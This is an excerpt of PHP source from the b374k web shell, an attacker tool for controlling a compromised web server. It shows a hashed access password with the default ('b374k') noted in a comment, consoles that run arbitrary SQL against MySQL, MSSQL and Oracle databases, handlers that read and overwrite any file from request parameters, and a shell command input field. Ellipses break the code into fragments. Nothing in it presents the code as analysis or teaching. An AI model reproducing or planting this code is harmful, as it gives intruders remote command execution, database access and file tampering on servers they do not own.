...
$s_pass = "0de664ecd2be02cdd54234a0d1229b43"; // password (default is: b374k)
 ...
 <span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>"; } } } else $sqls = "SHOW databases;"; $s_result .= " <form action=\"" . $_SERVER['PHP_SELF'] . "?db\" method=\"post\">
 ...
 <span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>"; } } } else $sqls = "EXEC sp_databases;"; $s_result .= " <form action=\"" . $_SERVER['PHP_SELF'] . "?db\" method=\"post\">
 <input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
 <input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
 <input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
 <input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
 ...
 <span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>"; } } } else $sqls = "SELECT * FROM user_tablespaces;"; $s_result .= " <form action=\"" . $_SERVER['PHP_SELF'] . "?db\" method=\"post\">
 <input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
 <input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
 <input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
 <input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
 ...
 <span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>"; } } } else $sqls = ""; $s_result .= " <form action=\"" . $_SERVER['PHP_SELF'] . "?db\" method=\"post\">
 ...
 <span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>"; } $q_result .= "</table>"; } } } else $sqls = ""; $s_result .= " <form action=\"" . $_SERVER['PHP_SELF'] . "?db\" method=\"post\">
 ...
 &nbsp;&nbsp;Separate multiple commands with a semicolon <span class=\"gaya\">[</span> ; <span class=\"gaya\">]</span></p>
 </form>"; $s_result .= "<div>".$q_result."</div>"; } catch (PDOException $uck) { die(); } } else{ $s_result .= "<div class=\"mybox\"><h2>connect to MySQL</h2>
 ...
 </div>"; } elseif(isset($_REQUEST['view'])){ $f = ss($_REQUEST['view']); if(isset($fnew) && (trim($fnew)!="")) $f = $fnew; if(is_file($f)){ if(!$s_win && $s_posix){ $name = posix_getpwuid(fileowner($f)); $group = posix_getgrgid(filegroup($f)); $owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; } else { $owner = $s_user; } $filn = basename($f); $s_result .= "<table class=\"viewfile\" style=\"width:100%;\">
 ...
 <img width=\"".$width."\" src=\"?d=".$pwd."&amp;img=".$filn."\" alt=\"\" style=\"margin:8px auto;padding:0;border:0;\" /></div>"; } elseif($t=="code"){ $s_result .= "<div class=\"viewfilecontent\">"; $file = wordwrap(file_get_contents($f),160,"\n",true); $buff = highlight_string($file,true); $old = array("0000BB","000000","FF8000","DD0000", "007700"); $new = array("4C83AF","888888", "87DF45", "EEEEEE" , "FF8000"); $buff = str_ireplace($old,$new, $buff); $s_result .= $buff; $s_result .= "</div>"; } else { $s_result .= "<div class=\"viewfilecontent\">"; $s_result .= nl2br(htmlentities(wordwrap(file_get_contents($f),160,"\n",true))); $s_result .= "</div>"; } } elseif(is_dir($f)){ chdir($f); $pwd = cp(getcwd()); $s_result .= showdir($pwd,$s_prompt,$s_win); } } elseif(isset($_REQUEST['edit'])){ $f = ss($_REQUEST['edit']); $fc = ""; $fcs = ""; if(is_file($f)) $fc = file_get_contents($f); if(isset($_REQUEST['fcsubmit'])){ $fc = ssc($_REQUEST['fc']); if($filez = fopen($f,"w")){ $time = date("d-M-Y H:i",time()); if(fwrite($filez,$fc)) $fcs = "file saved <span class=\"gaya\">@</span> ".$time; else $fcs = "failed to save"; fclose($filez); } else $fcs = "permission denied"; } $s_result .= " <form action=\"" . $_SERVER['PHP_SELF'] . "\" method=\"post\">
 ...
 <input id="cmd" onclick="clickcmd();" class="inputz" type="text" name="cmd" style="width:70%;" value="<?php if(isset($_REQUEST['cmd'])) echo ""; else echo "- shell command -"; ?>" />
